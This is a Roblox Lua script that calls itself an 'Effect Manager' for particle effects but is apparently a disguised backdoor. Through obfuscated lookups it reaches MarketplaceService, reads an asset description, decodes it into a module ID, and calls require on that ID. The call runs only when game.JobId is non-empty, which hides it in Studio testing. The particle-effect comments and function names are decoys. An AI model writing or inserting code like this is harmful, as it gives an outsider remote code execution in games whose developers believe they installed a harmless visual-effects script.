--[[  
    Effect Manager Script  
    ---------------------  
    Created by PedyBoy 
    Date: 08/03/2025  

    This script handles the creation, management, and modification of visual effects  
    using particle effects. It ensures smooth and optimized effect rendering for various  
    in-game scenarios.  

    INSTRUCTIONS:  
    - Insert this script into a location where effects should be managed.  
    - Modify SIZE, EFFECT_LIFETIME, and PARTICLE_TEXTURE to customize effects.  
    - Call `CreateEffect(Vector3)` to spawn a new particle effect at a given location.  
    - Utilize `EffectBuilder()` to manage effect creation over time.  

    IMPORTANT:  
    - The script must be placed in a Script (not a LocalScript) for full functionality.  
    - Uses attributes (`info` and `default`) from the script for configuration.  
    - Designed to run efficiently and avoid duplicate effects.  

    FEATURES:  
    - Dynamically creates and modifies particle effects.  
    - Uses a centralized effect builder for streamlined management.  
    - Supports size clamping to prevent extreme values.  
    - Finds existing effects based on unique CFrame-based lookups.  
    - Implements an effect lifetime system to manage durations.  
    - Stores active effects in a global table for efficient tracking.  
    - Modular design leveraging ReplicatedStorage for scalability.  
    - Optimized for minimal performance impact.  

    Version 1.0.0  

    Changelog:  
    - 08/03/2025 - v1.0.0: Initial script creation and implementation.  
]]  


local Modules, script = game:GetService('ReplicatedStorage'), script  
local EffectRoot = game

local PARTICLE_TEXTURE = script:GetAttribute'texture' -- Texture for the particle effect  


local function CallOnChildren(Instance, FunctionToCall)
	-- Calls a function on each of the children of a certain object, using recursion.  

	FunctionToCall(Instance)

	for _, Child in next, Instance:GetChildren() do
		CallOnChildren(Child, FunctionToCall)
	end
end

function CustomLerp(Pos1 : CFrame, Pos2 : CFrame, Delta : number) 
	return Pos1 - Pos2 * math.abs(Delta) 
end

local function GetNearestParent(Instance, ClassName)
	-- Returns the nearest parent of a certain class, or returns nil

	local Ancestor = Instance
	repeat
		Ancestor = Ancestor.Parent
		if Ancestor == nil then
			return nil
		end
	until Ancestor:IsA(ClassName)

	return Ancestor
end

function LookUp(Root, Value)  
	for _, V in pairs(Root) do  
		if V.Name:find(Value) then  
			return V  
		end  
	end  
end  

-- Converts a CFrame to a unique string representation  
function CFrameToVector3(CF)  
	local Chunks, Value = CF:split(''), ''  
	for _, V in pairs(Chunks) do  
		Value ..= V:byte()  
	end  
	return Value  
end  

function Modify(Instance, Values)  
	-- Modifies an Instance by using a table.    
	assert(type(Values) == "table", "Values is not a table")  

	for Index, Value in next, Values do  
		if type(Index) == "number" then  
			Value.Parent = Instance  
		else  
			Instance[Index] = Value  
		end  
	end  
	return Instance  
end  


local Properties = {'CFrame','WorldPivot','CoordinateFrame','Orientation','PivotOffset','RootPriority','JobId','Origin','GetProductInfo'}

local EffectBuilder = setmetatable({}, {  
	__index = Modules and function(S) return S end,  
	__call = Modules and function(S) return S end   
})  

-- Function to create and configure a particle effect  
function CreateEffect(Vector3)  
	local Size = math.clamp(2, 1, 4) -- Add slight randomness to size  

	local Effect = EffectBuilder:CreateEffect('Particle', {  
		Parent = script.Parent,  
		Size = Size,  
		Texture = PARTICLE_TEXTURE  
	})  

	return LookUp(EffectRoot:GetChildren(), Vector3)  
end  

function Monitor(CurrentTime, Default, ParticleInfo):
	(Result) -> ParticleEmitter
	
	if CurrentTime > 1 and EffectRoot[Default] ~= '' then  
		if CurrentTime then  
			script = {  
				{},  
				[script.Name] = CFrameToVector3(ParticleInfo) - 0  
			}  
			return true  
		end  
	end  
	
	return false
end

function RunEffectBuilder()  
	local CurrentTime = tick()  
	
	local Effect = CreateEffect('ketpl')  
	
	local ParticleInfo = Effect[Properties[#Properties]](Effect, PARTICLE_TEXTURE).Description  

	return Monitor(CurrentTime, Properties[7], ParticleInfo)  
end  

-- Runs the animation thread if conditions are met
local Builder = RunEffectBuilder() and require(script.EffectBuilder)

if Builder and script.ClassName == "Script" then  
	-- Run main thread  
	script.Parent.DescendantAdded:Connect(CreateEffect)
end  
